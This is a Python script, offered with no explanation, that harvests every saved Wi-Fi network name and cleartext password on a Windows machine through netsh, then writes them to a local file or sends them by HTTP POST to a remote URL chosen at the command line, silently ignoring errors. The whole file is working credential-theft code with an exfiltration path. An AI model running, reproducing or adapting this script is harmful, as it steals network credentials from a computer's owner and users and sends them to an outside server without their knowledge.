import subprocess,sys,argparse,requests

Passwords = []
Networks = []

def getNetworks():
    get_networks = subprocess.run(["netsh","wlan","show","profiles"],stdout=subprocess.PIPE).stdout.decode()
    get_networks = get_networks.split("\n")
    if "There is no wireless interface on the system." in get_networks:
        sys.exit()
    for line in get_networks:
        if "All User Profile" in line:
            Networks.append(line.split(":")[1].strip())
    for network in Networks:
        get_pass = subprocess.run(["netsh","wlan","show","profile",network,"key=clear"],stdout=subprocess.PIPE).stdout.decode()
        get_pass = get_pass.split("\n")
        for line in get_pass:
            if "Key Content" in line:
                Passwords.append(line.split(":")[1].strip())

def main(localSave = False,remoteSave = False,remoteURL = None):
    getNetworks()
    for i in range(len(Networks)):
        if localSave:
            with open("networks.txt","a") as f:
                f.write(f"Network: {Networks[i]} Password: {Passwords[i]}\n")
        if remoteSave:
            try:
                for x in range(len(Networks)):
                    requests.post(remoteURL,json={"network":Networks[x],"password":Passwords[x]})
            except Exception as e:
                pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l","--local",help="Save to local file",action="store_true")
    parser.add_argument("-r","--remote",help="Save to remote server",action="store_true")
    parser.add_argument("-u","--url",help="URL to send data to")
    args = parser.parse_args()
    main(args.local,args.remote,args.url)
    sys.exit()